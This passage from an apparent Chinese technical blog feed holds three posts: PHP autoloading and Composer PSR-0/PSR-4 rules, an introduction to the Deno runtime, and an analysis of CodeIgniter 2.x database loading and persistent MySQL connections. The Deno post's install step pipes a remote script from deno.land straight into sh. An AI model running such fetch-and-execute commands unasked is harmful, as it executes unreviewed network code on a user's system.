<p>在大型的项目开发中，文件之间的错综复杂的引用关系很容易导致一个文件被多次引入，虽然 PHP 提供了 require_once 和 include_once 避免文件的重复引入，require_once 和 include_once 会将引入过的文件保存在EG(included_files)哈希表中，再次加载时检查这个哈希表，如果发现已经加载过则直接跳过，随着引入文件的增多，维护哈希表的代价会增大，因此 PHP 5 引入了自动加载（autoloat）机制，这种机制会在文件被需要的时候引入近来，这种文件包含方式也称作懒加载（lazy loading），在前端的 NPM 包加载中也被广泛使用。</p>
<h2 id="autoload"><a href="#autoload" class="headerlink" title="__autoload()"></a>__autoload()</h2><p>PHP 将所有以 __（两个下划线）开头的<strong>类方法</strong>保留为魔术方法，这类方法往往是在触发某个异常之前被执行。</p>
<p>如在调用不存在的方法是<code> __call()</code>方法会被自动调用，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestCall</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="comment">// TODO throw exception</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;function &#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27; not exist!&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">TestCall</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;<span class="title function_ invoke__">sayHello</span>();  <span class="comment">// function sayHello not exist!</span></span><br></pre></td></tr></table></figure>



<p>类似的，PHP 提供了 魔术方法 <code>__autoload()</code>， 当使用一个未定义的类时，以该方法被自动调用，类名作为参数，我们可以在发生异常之前的最后一刻去尝试引入这个类，这就是自动加载的原理，如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$className</span></span>)</span>&#123;</span><br><span class="line">	<span class="comment">// 自定义加载规则，包括类名称，类存储位置等</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="variable">$className</span>.<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>值得注意的是，如果要实现自动加载必须能根据类名确定文件位置和文件名。</p>
<p>__autoload 缺点： __</p>
<ul>
<li>类名与文件名的所有逻辑映射规则都要在一个函数中实现从而使得自动加载规则相当不灵活，代码也变得很臃肿</li>
</ul>
<h2 id="spl-autoload-register"><a href="#spl-autoload-register" class="headerlink" title="__spl_autoload_register()"></a>__spl_autoload_register()</h2><p> 为了改进这一问题，PHP 推出了 <code>spl_autoload_register()</code> ，用于注册给定的函数作为 __autoload 的实现，从而实现类名与文件名之间可以有多套逻辑映射规则，不同的映射规则分别调用一个 __autoload 函数即可，比如规则自动加载文件分别存在 A 目录和 B 目录下，使用 <code>spl_autoload_register()</code> 可以注册两个自动加载函数，分别将 A和B目录下的以类名同名的文件引入进来。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ruleA</span>(<span class="params"><span class="variable">$class</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;A/&#x27;</span>.<span class="variable">$class</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ruleB</span>(<span class="params"><span class="variable">$class</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;B/&#x27;</span>.<span class="variable">$class</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(<span class="string">&quot;ruleA&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(<span class="string">&quot;ruleB&quot;</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(); <span class="comment">// test 不存在，自动加载器会尝试引入 A/test.php 和 B/test.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>和 <code>spl_autoload_register()</code> 一起推出的还有很多函数，这些函数可以很灵活的管理自动加载，</p>
<blockquote>
<ol>
<li>spl_autoload_register：注册 _autoload() 函数</li>
<li>spl_autoload_unregister：注销已注册的函数</li>
<li>spl_autoload_functions：返回所有已注册的函数</li>
<li>spl_autoload_call：尝试所有已注册的函数来加载类</li>
<li>spl_autoload ：_autoload() 的默认实现</li>
<li>spl_autoload_extionsions： 注册并返回 spl_autoload 函数使用的默认文件扩展名。</li>
</ol>
</blockquote>
<h2 id="Composer"><a href="#Composer" class="headerlink" title="Composer"></a>Composer</h2><p>Composer 是 PHP 包管理工具，其作用和 JavaScript 中的 NPM 相当，其基本使用<a href="https://docs.phpcomposer.com/00-intro.html">参考文档</a>。每个 Composer 包都有一个 composer.json 的配置文件，想要创建一个包只需在包的根路径下执行命令<code>composer init</code>。composer.json 中 <code>autoload</code> 字段提供配置自动加载方式，包括如下四种</p>
<blockquote>
<p>classmap<br>psr-0<br>psr-4<br>files</p>
</blockquote>
<ol>
<li><strong>classmap</strong></li>
</ol>
<p>这应该是最最简单的 autoload 模式了。大概的意思就是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;classmap&quot;: [&quot;src/&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后 composer 在背后就会读取这个文件夹中所有的文件 然后再 <code>vendor/composer/autoload_classmap.php</code> 中怒将所有的 <strong>class</strong> 的 namespace + classname 生成成一个 key &#x3D;&gt; value 的 php 数组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">return [ </span><br><span class="line">  &#x27;App\\Console\\Kernel&#x27; =&gt; $baseDir . &#x27;/app/Console/Kernel.php&#x27;</span><br><span class="line">];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后就可以光明正大地用 <code>spl_autoload_register</code> 这个函数来怒做自动加载了。</p>
<p>好吧 上面的例子其实有点 tricky 就是上面这个 autoload 实际上是根据 prs-4 来生成出来的。不过这不重要，了解底层重要点，我们可以看到所有的所谓的 autoloading 其实可以理解为生成了这么一个 <code>classmap</code>，这是 <code>composer dump-autoload -o</code> 做的事儿。不然的话<code>compoesr</code> 会吭哧吭哧地去动态读取 psr-4 和 prs-0 的内容。</p>
<ol start="2">
<li><strong>psr-0</strong></li>
</ol>
<p>现在这个标准已经过时了。当初制定这个标准的时候主要是在 php 从 5.2 刚刚跃迁到 5.3+ 有了命名空间的概念。所以这个时候 <code>psr-0</code> 的标准主要考虑到了 &lt;5.2 的 php 中 类似 <code>Acme_Util_ClassName</code> 这样的写法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;acme/util&quot;,</span><br><span class="line">  &quot;auto&quot; : &#123;</span><br><span class="line">    &quot;psr-0&quot;: &#123;</span><br><span class="line">      &quot;Acme\\Util\\&quot;: &quot;src/&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文档结构是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vendor/</span><br><span class="line">  acme/</span><br><span class="line">    util/</span><br><span class="line">      composer.json</span><br><span class="line">      src/</span><br><span class="line">        Acme/</span><br><span class="line">          Util/</span><br><span class="line">            ClassName.php</span><br></pre></td></tr></table></figure>

<p>ClassName.php 中是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Acme_Util_ClassName&#123;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以看到由于旧版本的 php 没有 namespace 所以必须通过 <code>_</code> 将类区分开。</p>
<p>这样稍微有点麻烦。指向一个文件夹之后 <code>src</code> 还要在 <code>src</code> 中分成好几层文档树。这样太深了。没有办法，但是似乎想要兼容 <code>_</code> 的写法仔细想想这是唯一的办法了。（psr-0 要求 autoloading 的时候将 类中的 <code>_</code> 转义为 ‘’）</p>
<p>所以在 php5.2 版本已经彻底被抛弃的今天， <code>FIG</code> 就怒推出了 <code>psr-4</code></p>
<ol start="3">
<li><strong>psr-4</strong></li>
</ol>
<p>这个标准出来的时候一片喷声，大概的意思就是 <code>FIG</code> 都是傻逼么，刚刚出了 <code>psr-0</code> 然后紧跟着进推翻了自己。不过 FIG 也有自己的苦衷，帮没有 namespace 支持的 php5.2 擦了那么久的屁股，在2014年10月21日的早晨，终于丢失了睡眠。</p>
<p>抛弃了 psr-0 的 composer 从此变得非常清爽。</p>
<p>最简单来讲就是可以把 prs-4 的 namespace 直接想想成 file structure</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;acme/util&quot;,</span><br><span class="line">  &quot;auto&quot; : &#123;</span><br><span class="line">    &quot;psr-4&quot;: &#123;</span><br><span class="line">      &quot;Acme\\Util\\&quot;: &quot;src/&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">vendor/</span><br><span class="line">  acme/</span><br><span class="line">    util/</span><br><span class="line">      composer.json</span><br><span class="line">      src/</span><br><span class="line">        ClassName.php</span><br></pre></td></tr></table></figure>

<p>可以看到将 <code>Acme\Util</code> 指向了 <code>src</code> 之后 psr-4 就会默认所有的 <code>src</code> 下面的 class 都已经有了 <code>Acme\Util</code> 的 基本 namespace，而 psr-4 中不会将 <code>_</code> 转义成 <code>\</code> 所以就没有必要有 psr-0 那么深得文档结构了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Acme\Util;</span><br><span class="line">class ClassName &#123;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><strong>file</strong></li>
</ol>
<p>然而这还是不够。因为可能会有一些全局的 helper function 的存在。</p>
<p>这个写法很简单就不多看了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;files&quot;: [</span><br><span class="line">    &quot;path/to/file.php&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="PHP-命名规范"><a href="#PHP-命名规范" class="headerlink" title="PHP 命名规范"></a>PHP 命名规范</h2><p>在过去的 2018 年里，笔者曾经介绍过<a href="https://0x400.com/2018-08-01-php-namespace.html">PHP 命名空间</a>，当时提到 PSR 要求，命名空间应与文件路径一致，比如 Laravel 默认生成的 <code>app/Http/Controllers/Auth/LoginController.php</code>，其命名空间为 <code>App\Http\Controllers\Auth</code>， PSR 的命名规范是给出了类名与文件名之间的一种映射，以便实现自动加载。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://laravelacademy.org/post/7074.html">https://laravelacademy.org/post/7074.html</a></li>
</ul>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>新一代的 JavaScript/TypeScript 运行时 —— Deno</title>
    <url>/fundamental/programming-language/javascript/dev-deno-intro/</url>
    <content><![CDATA[<h2 id="Deno-是什么？"><a href="#Deno-是什么？" class="headerlink" title="Deno 是什么？"></a>Deno 是什么？</h2><p>Deno 是新一代的 JavaScrip 和 TypeScript 运行时环境。建立在 V8, Rust, TypeSctipt 之上。</p>
<p><img src="/images/2020-04/01-what.png"></p>
<span id="more"></span>

<h3 id="安装体验"><a href="#安装体验" class="headerlink" title="安装体验"></a>安装体验</h3><p>在 Linux 下安装体验：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -fsSL https://deno.land/x/install/install.sh | sh</span></span><br></pre></td></tr></table></figure>

<p>脚本执行完成后需要手动将安装目录加入到环境变量中，即将以下脚本追加到 <code>~/.zshrc</code> 或类似文件中。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export DENO_INSTALL=&quot;/home/gbin/.deno&quot;</span><br><span class="line">export PATH=&quot;$DENO_INSTALL/bin:$PATH&quot;</span><br></pre></td></tr></table></figure>

<p>安装成功后，执行 <code>deno -h</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ~ deno -h</span><br><span class="line">deno 0.40.0</span><br><span class="line">A secure JavaScript and TypeScript runtime</span><br><span class="line"></span><br><span class="line">Docs: https://deno.land/std/manual.md</span><br><span class="line">Modules: https://deno.land/std/ https://deno.land/x/</span><br><span class="line">Bugs: https://github.com/denoland/deno/issues</span><br><span class="line"></span><br><span class="line">To start the REPL, supply no arguments:</span><br><span class="line">  deno</span><br><span class="line"></span><br><span class="line">To execute a script:</span><br><span class="line">  deno run https://deno.land/std/examples/welcome.ts</span><br><span class="line">  deno https://deno.land/std/examples/welcome.ts</span><br><span class="line"></span><br><span class="line">To evaluate code in the shell:</span><br><span class="line">  deno eval &quot;console.log(30933 + 404)&quot;</span><br><span class="line"></span><br><span class="line">Run &#x27;deno help run&#x27; for &#x27;run&#x27;-specific flags.</span><br><span class="line"></span><br><span class="line">USAGE:</span><br><span class="line">    deno [OPTIONS] [SUBCOMMAND]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">    -h, --help                     Prints help information</span><br><span class="line">    -L, --log-level &lt;log-level&gt;    Set log level [possible values: debug, info]</span><br><span class="line">    -q, --quiet                    Suppress diagnostic output</span><br><span class="line">    -V, --version                  Prints version information</span><br><span class="line"></span><br><span class="line">SUBCOMMANDS:</span><br><span class="line">    bundle         Bundle module and dependencies into single file</span><br><span class="line">    cache          Cache the dependencies</span><br><span class="line">    completions    Generate shell completions</span><br><span class="line">    doc            Show documentation for module</span><br><span class="line">    eval           Eval script</span><br><span class="line">    fmt            Format source files</span><br><span class="line">    help           Prints this message or the help of the given subcommand(s)</span><br><span class="line">    info           Show info about cache or info related to source file</span><br><span class="line">    install        Install script as executable</span><br><span class="line">    repl           Read Eval Print Loop</span><br><span class="line">    run            Run a program given a filename or url to the module</span><br><span class="line">    test           Run tests</span><br><span class="line">    types          Print runtime TypeScript declarations</span><br><span class="line">    upgrade        Upgrade deno executable to newest version</span><br><span class="line"></span><br><span class="line">ENVIRONMENT VARIABLES:</span><br><span class="line">    DENO_DIR       Set deno&#x27;s base directory</span><br><span class="line">    NO_COLOR       Set to disable color</span><br><span class="line">    HTTP_PROXY     Proxy address for HTTP requests (module downloads, fetch)</span><br><span class="line">    HTTPS_PROXY    Same but for HTTPS</span><br></pre></td></tr></table></figure>

<p>输出当前版本是 0.40.0，可选参数、子命令和环境变量比起 Node 还很有限，是学习 Deno 的好时机。deno 可以执行远程脚本，且内置了 TS 编译器，如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">deno https://deno.land/std/examples/welcome.ts</span></span><br></pre></td></tr></table></figure>

<p>简单体验后给人深入探索的欲望。</p>
<h2 id="为什么要有-deno？"><a href="#为什么要有-deno？" class="headerlink" title="为什么要有 deno？"></a>为什么要有 deno？</h2><p>作者本想用 JS 做机器学习相关的框架，但是发现 JS 发展太快了，早就不是 2009 年开发 Node 时候的 JS 了，基于 JavaScript 的发展和 Node 的不足，决定开发 Deno。</p>
<p><img src="/images/2020-04/01-why.png"></p>
<p>Deno 保持了 JS 单线程的特点，集成了 TS 编译器，去中心化的模块导入机制。</p>
<p><img src="/images/2020-04/03-feature.png"></p>
<p>Deno 使用 Rust 开发，不在选用 C++，</p>
<p><img src="/images/2020-04/04-why-rust.png"></p>
<p>参考视频：</p>
<ul>
<li><a href="https://www.youtube.com/watch?v=lcoU9jtsK24">https://www.youtube.com/watch?v=lcoU9jtsK24</a></li>
<li><a href="https://www.youtube.com/watch?v=1gIiZfSbEAE">https://www.youtube.com/watch?v=1gIiZfSbEAE</a></li>
</ul>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Deno</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeIgniter load database 分析</title>
    <url>/fundamental/programming-language/php/php-codeigniter-load-database-analysis/</url>
    <content><![CDATA[<p>使用 CodeIgniter 2.x 可以配置 autoload 自动加载数据库，也可以在 Model 的构造函数中使用<code>$this-&gt;load-&gt;database()</code>方法加载数据库：</p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># xxx.model</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;db_config.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xxx_model</span> <span class="keyword">extends</span> <span class="title">CI_Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable language_">$this</span>-&gt;load-&gt;<span class="title function_ invoke__">database</span>(<span class="title class_">DB_Config</span>::<span class="variable">$db_config</span>[<span class="string">&quot;mydb&quot;</span>], <span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// other code ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="database-方法"><a href="#database-方法" class="headerlink" title="database() 方法"></a>database() 方法</h3><p><code>$this-&gt;load-&gt;database()</code>方法位于 <code>system/core/Loader.php</code>中，此方法返回 <code>DB($params, $active_record)</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Database Loader</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>	string	the DB credentials</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>	bool	whether to return the DB object</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>	bool	whether to enable active record (this allows us to override the config setting)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>	object</span></span><br><span class="line"><span class="comment"> */</span>	</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">database</span>(<span class="params"><span class="variable">$params</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$return</span> = <span class="literal">FALSE</span>, <span class="variable">$active_record</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Grab the super object</span></span><br><span class="line">	<span class="variable">$CI</span> =&amp; <span class="title function_ invoke__">get_instance</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Do we even need to load the database class?</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">class_exists</span>(<span class="string">&#x27;CI_DB&#x27;</span>) AND <span class="variable">$return</span> == <span class="literal">FALSE</span> AND <span class="variable">$active_record</span> == <span class="literal">NULL</span> AND <span class="keyword">isset</span>(<span class="variable">$CI</span>-&gt;db) AND <span class="title function_ invoke__">is_object</span>(<span class="variable">$CI</span>-&gt;db))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">require_once</span>(BASEPATH.<span class="string">&#x27;database/DB.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$return</span> === <span class="literal">TRUE</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">DB</span>(<span class="variable">$params</span>, <span class="variable">$active_record</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Initialize the db variable.  Needed to prevent</span></span><br><span class="line">	<span class="comment">// reference errors with some configurations</span></span><br><span class="line">	<span class="variable">$CI</span>-&gt;db = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Load the DB class</span></span><br><span class="line">	<span class="variable">$CI</span>-&gt;db =&amp; <span class="title function_ invoke__">DB</span>(<span class="variable">$params</span>, <span class="variable">$active_record</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DB-方法"><a href="#DB-方法" class="headerlink" title="DB() 方法"></a>DB() 方法</h3><p><code>DB()</code>方法位于 <code>system/database/DB.php</code> 中，此方法重点完成以下两个任务</p>
<ol>
<li><code>new $driver($params)</code></li>
<li><code>$DB-&gt;initialize()</code></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Initialize the database</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@category</span>	Database</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>		EllisLab Dev Team</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span>		http://codeigniter.com/user_guide/database/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> 	string</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> 	bool	Determines if active record should be used or not</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">DB</span>(<span class="params"><span class="variable">$params</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$active_record_override</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Load the DB config file if a DSN string wasn&#x27;t passed</span></span><br><span class="line">	<span class="comment">// ... some code here</span></span><br><span class="line">	<span class="keyword">require_once</span>(BASEPATH.<span class="string">&#x27;database/drivers/&#x27;</span>.<span class="variable">$params</span>[<span class="string">&#x27;dbdriver&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$params</span>[<span class="string">&#x27;dbdriver&#x27;</span>].<span class="string">&#x27;_driver.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Instantiate the DB adapter</span></span><br><span class="line">	<span class="variable">$driver</span> = <span class="string">&#x27;CI_DB_&#x27;</span>.<span class="variable">$params</span>[<span class="string">&#x27;dbdriver&#x27;</span>].<span class="string">&#x27;_driver&#x27;</span>;</span><br><span class="line">	<span class="variable">$DB</span> = <span class="keyword">new</span> <span class="variable">$driver</span>(<span class="variable">$params</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$DB</span>-&gt;autoinit == <span class="literal">TRUE</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$DB</span>-&gt;<span class="title function_ invoke__">initialize</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// some code here ...</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$DB</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当 autoinit 为 true 时，自动初始化数据库，<code>$DB-&gt;initialize()</code>，此方法位于 <code>system/database/DB_driver.php</code>中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Initialize Database Settings</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span>	private Called by the constructor</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>	mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>	void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initialize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// If an existing connection resource is available</span></span><br><span class="line">	<span class="comment">// there is no need to connect and select the database</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$this</span>-&gt;conn_id) OR <span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;conn_id))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ----------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Connect to the database and set the connection ID</span></span><br><span class="line">	<span class="variable language_">$this</span>-&gt;conn_id = (<span class="variable language_">$this</span>-&gt;pconnect == <span class="literal">FALSE</span>) ? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">db_connect</span>() : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">db_pconnect</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// No connection resource?  Throw an error</span></span><br><span class="line">	<span class="comment">// some code here ...</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="数据库长连接"><a href="#数据库长连接" class="headerlink" title="数据库长连接"></a>数据库长连接</h3><p>根据 <code>$this-&gt;pconnect</code> 决定数据库使用长连接或者短连接，<code>$this-&gt;pconnect</code> 的取值在数据库配置文件中配置。MySQL 的长连接是存在 php-fpm 子进程里的，进程之间是不共享连接的，所以每个 php-fpm 进程都有一个单独的长连接。使用 </p>
<p><code>ps -aux | grep fpm</code> 和 <code>netstat -anp | grep 3306</code> 可分别查看 fpm 子进程个数和 MySQL 长连接个数相同。</p>
<p><img src="/images/20180331/fpm-pconnect.png"></p>
<p>使用 MySQL 长连接可以复用连接通道，减小连接时延，当 PHP 应用访问量不高，并发量不大时，我们只需要开启少量 php-fpm 子进程，每个子进程对应一个 MySQL 连接，但是当应用并发增加， php-fpm 子进程数量扩大时，MySQL 连接数也随之增加，对数据库造成较大压力，特别是当连接数达到数据库上限时会导致其他 fpm 连接异常。因此要注意使用长连接时 fpm 的子进程数不应超过数据库的最大连接数，在数据库中使用<code>SHOW VARIABLES like &#39;max_connections&#39;;</code> 查看数据库最大连接数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查看MySQL最大连接数</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> VARIABLES <span class="keyword">like</span> <span class="string">&#x27;max_connections&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name   <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-------+</span></span><br><span class="line"><span class="operator">|</span> max_connections <span class="operator">|</span> <span class="number">20000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-------+</span></span><br></pre></td></tr></table></figure>



<h3 id="数据库初始化"><a href="#数据库初始化" class="headerlink" title="数据库初始化"></a>数据库初始化</h3><p>关于 <code>autoinit</code> ： CI 2.x 中默认为  true, 有些业务场景使用缓存且缓存命中率较高，若启用 <code>autoinit</code>，处理每个请 PHP 求时都会去连接数据库，耗时严重。使用 <code>strace -c -p 360558</code> 分析 360558  (FPM 进程id) 进程程序执行情况得出， 程序执行时 read 操作耗时最长。</p>
<p><img src="/images/20180331/count-read-db.png"></p>
<p>再使用 <code>strace  -p 360558 2&gt;&amp;1</code> 查看 360558  (FPM 进程id) 进程程序执行情况发现有大量的 read() 和 write() 操作，经分析发现一个参数为 4 的时候为数据库相关操作。</p>
<p><img src="/images/20180331/read-db.png"></p>
<p>将 <code>autoinit</code> 改为 false 后，read 和 write 耗时几乎为 0.</p>
<p><img src="/images/20180331/no-read.png"></p>
<p><strong>需要注意的时将 autoinit 改为 false 后，CI 会报如下错误</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_escape_string(): This function is deprecated; use mysql_real_escape_string() instead.</span><br></pre></td></tr></table></figure>

<p>参照 <a href="https://stackoverflow.com/questions/26169455/codeigniter-use-mysql-real-escape-string-instead-database-connection-issue">https://stackoverflow.com/questions/26169455/codeigniter-use-mysql-real-escape-string-instead-database-connection-issue</a> 修改 <code>system/database/drivers/mysql/mysql_driver.php</code>下的 <code>escape_str()</code> 为：</p>
